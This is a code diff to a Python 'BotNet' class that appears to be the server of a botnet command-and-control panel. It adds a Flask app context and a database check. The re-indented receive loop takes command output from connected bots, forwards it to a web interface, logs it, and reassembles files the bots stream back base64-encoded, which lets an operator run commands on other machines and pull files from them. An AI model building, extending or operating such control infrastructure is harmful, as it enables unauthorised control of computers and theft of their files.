@@ -28,18 +28,23 @@ class BotNet(Thread):
     DEFAULT_PAYLOAD = os.path.join(os.path.dirname(__file__), 'payloads')
     DEFAULT_DOWNLOADPATH = os.path.join(os.path.join(os.path.dirname(__file__), 'media'), 'downloads')
 
-    def __init__(self, socketio, payloadpath=DEFAULT_PAYLOAD, downloadpath=DEFAULT_DOWNLOADPATH):
+    def __init__(self, socketio, app, payloadpath=DEFAULT_PAYLOAD, downloadpath=DEFAULT_DOWNLOADPATH):
         super().__init__()
         self.connlock = threading.Lock()
         self.conncon = threading.Condition(self.connlock)
         self.onlineConnections = {}
         self.offlineConnections = {}
         self.logs = {}
+        self.app = app
         self.socketio = socketio
 
         self.filemanager = BotNetFileManager(downloadpath)
         self.payloadmanager = BotNetPayloadManager(payloadpath)
         self.downloaddir = downloadpath
+
+    def checkDB(self):
+        with self.app.app_context():
+            self.filemanager.checkDatabase()
 
     def hasConnection(self, user):
         with self.connlock:
@@ -135,87 +140,88 @@ class BotNet(Thread):
                 while len(bots) == 0:
                     self.conncon.wait()
                     bots = list(self.onlineConnections.values())
-            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
-            # TODO maybe use pipe as interrupt instead of timeout?
-            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
-            # We now have a tuple of all bots that have sent data to the botnet
-            for bot in rs:
-                user = bot.user
-                try:
-                    msg = bot.recv()
-                    jsonobj = json.loads(msg.decode('UTF-8'))
-                    printout = ""
-                    errout = ""
-                    out = ""
-                    err = ""
-                    special = {}
-                    filestream = {}
-                    fileclose = []
+            with self.app.app_context():
+                # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
+                # TODO maybe use pipe as interrupt instead of timeout?
+                rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
+                # We now have a tuple of all bots that have sent data to the botnet
+                for bot in rs:
+                    user = bot.user
+                    try:
+                        msg = bot.recv()
+                        jsonobj = json.loads(msg.decode('UTF-8'))
+                        printout = ""
+                        errout = ""
+                        out = ""
+                        err = ""
+                        special = {}
+                        filestream = {}
+                        fileclose = []
 
-                    if BotNet.PRINTOUT_JSON in jsonobj:
-                        printout = jsonobj[BotNet.PRINTOUT_JSON]
-                    if BotNet.ERROUT_JSON in jsonobj:
-                        errout = jsonobj[BotNet.ERROUT_JSON]
-                    if BotNet.STDOUT_JSON in jsonobj:
-                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
-                    if BotNet.STDERR_JSON in jsonobj:
-                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
-                    if BotNet.SPEC_JSON in jsonobj:
-                        special = jsonobj[BotNet.SPEC_JSON]
-                    if BotNet.FILESTREAM_JSON in jsonobj:
-                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
-                    if BotNet.FILECLOSE_JSON in jsonobj:
-                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]
+                        if BotNet.PRINTOUT_JSON in jsonobj:
+                            printout = jsonobj[BotNet.PRINTOUT_JSON]
+                        if BotNet.ERROUT_JSON in jsonobj:
+                            errout = jsonobj[BotNet.ERROUT_JSON]
+                        if BotNet.STDOUT_JSON in jsonobj:
+                            out = jsonobj[BotNet.STDOUT_JSON].rstrip()
+                        if BotNet.STDERR_JSON in jsonobj:
+                            err = jsonobj[BotNet.STDERR_JSON].rstrip()
+                        if BotNet.SPEC_JSON in jsonobj:
+                            special = jsonobj[BotNet.SPEC_JSON]
+                        if BotNet.FILESTREAM_JSON in jsonobj:
+                            filestream = jsonobj[BotNet.FILESTREAM_JSON]
+                        if BotNet.FILECLOSE_JSON in jsonobj:
+                            fileclose = jsonobj[BotNet.FILECLOSE_JSON]
 
-                    # Forward stdout/stderr... as needed
-                    totallen = len(printout) + len(errout) + len(out) + len(err)
-                    if totallen > 0:
-                        # Send through socket
-                        self.socketio.emit('response',
-                                           {'user': user,
-                                            'printout': printout,
-                                            'errout': errout,
-                                            'stdout': out,
-                                            'stderr': err},
-                                           namespace="/bot")
-                        # Separate to minimize time in Lock
-                        log = None
-                        with self.connlock:
-                            if user in self.logs:
-                                log = self.logs[user]
-                        if log:
-                            log.logstdout(printout)
-                            log.logstderr(errout)
-                            log.logstdout(out)
-                            log.logstderr(err)
-
-                    if len(special) > 0:
-                        if BotNet.LS_JSON in special:
-                            self.socketio.emit('finder',
-                                               {'special': special,
-                                                'user': user},
+                        # Forward stdout/stderr... as needed
+                        totallen = len(printout) + len(errout) + len(out) + len(err)
+                        if totallen > 0:
+                            # Send through socket
+                            self.socketio.emit('response',
+                                               {'user': user,
+                                                'printout': printout,
+                                                'errout': errout,
+                                                'stdout': out,
+                                                'stderr': err},
                                                namespace="/bot")
-                        if BotNet.FILESIZE_JSON in special:
-                            self.socketio.emit('success', {'user': user,
-                                                           'message': "File download beginning",
-                                                           'type': 'download'},
-                                               namespace='/bot')
-                            fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
-                            self.filemanager.setFileSize(user, fileinfo['filename'], fileinfo['filesize'])
+                            # Separate to minimize time in Lock
+                            log = None
+                            with self.connlock:
+                                if user in self.logs:
+                                    log = self.logs[user]
+                            if log:
+                                log.logstdout(printout)
+                                log.logstderr(errout)
+                                log.logstdout(out)
+                                log.logstderr(err)
 
-                    # Forward file bytes as needed
-                    for filename in filestream.keys():
-                        # Get the b64 encoded bytes from the client in string form, change to normal bytes
-                        filebytes = base64.b64decode(filestream[filename])
-                        self.filemanager.appendBytesToFile(user, filename, filebytes)
+                        if len(special) > 0:
+                            if BotNet.LS_JSON in special:
+                                self.socketio.emit('finder',
+                                                   {'special': special,
+                                                    'user': user},
+                                                   namespace="/bot")
+                            if BotNet.FILESIZE_JSON in special:
+                                self.socketio.emit('success', {'user': user,
+                                                               'message': "File download beginning",
+                                                               'type': 'download'},
+                                                   namespace='/bot')
+                                fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
+                                self.filemanager.setFileSize(user, fileinfo['filename'], fileinfo['filesize'])
 
-                    for filename in fileclose:
-                        self.filemanager.closeFile(user, filename)
+                        # Forward file bytes as needed
+                        for filename in filestream.keys():
+                            # Get the b64 encoded bytes from the client in string form, change to normal bytes
+                            filebytes = base64.b64decode(filestream[filename])
+                            self.filemanager.appendBytesToFile(user, filename, filebytes)
 
-                except IOError as e:
-                    # Connection was interrupted, set to offline
-                    print(e)
-                    self.setOffline(user)
+                        for filename in fileclose:
+                            self.filemanager.closeFile(user, filename)
+
+                    except IOError as e:
+                        # Connection was interrupted, set to offline
+                        print(e)
+                        self.setOffline(user)
 
     def getLog(self, user):
         with self.connlock:
